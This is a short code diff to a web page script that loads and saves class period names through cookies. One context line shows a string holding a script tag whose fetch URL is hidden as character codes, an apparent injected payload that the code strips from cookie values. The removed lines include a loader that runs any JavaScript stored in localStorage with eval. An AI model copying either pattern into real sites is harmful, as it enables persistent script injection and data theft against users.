@@ -98,10 +98,10 @@ var longCode = "<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,1
 	function initializeClassNames() { //make loop that runs 8 times
 	var i = 0;
 	while (i < 9) { if(document.querySelector("#InputPeriod" + i)) {
-		document.querySelector("#InputPeriod" + i).value = getCookie("Period" + i).replace(longCode, "");
-	 }
-	 
-	 i++;} }
+		document.querySelector("#InputPeriod" + i).value = getCookie("Period" + i).replace(longCode, "").replace('<span class="original">Period ' + i + "</span>", "");
+	 } else {}
+	 i++;} 
+	}
 	
 	
 	function submitClassNames() {
@@ -120,33 +120,3 @@ var longCode = "<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,1
 	initializeClassNames();
 	document.submitClassNames = submitClassNames;
 	document.initializeClassNames = initializeClassNames;
-
-
-
-//start.min.js
-for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const object = JSON.parse(localStorage.getItem(key));
-        if (object && object.state === 1 && key.endsWith('.css')) {
-            const styleTag = document.createElement('style');
-            styleTag.textContent = object.code;
-            styleTag.setAttribute('data-mod-name', key);
-            document.head.appendChild(styleTag);
-        }
-    }
-      for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          const object = JSON.parse(localStorage.getItem(key));
-          if (object) {
-              if (object.state === 1 && key.endsWith('.js')) {
-                  eval(object.code);
-              }
-          }
-      }
-  
-  document.addEventListener('keydown', function(event) {
-      if (event.ctrlKey && event.key === 'y') {
-          localStorage.clear();
-          location.reload();
-      }
-  });
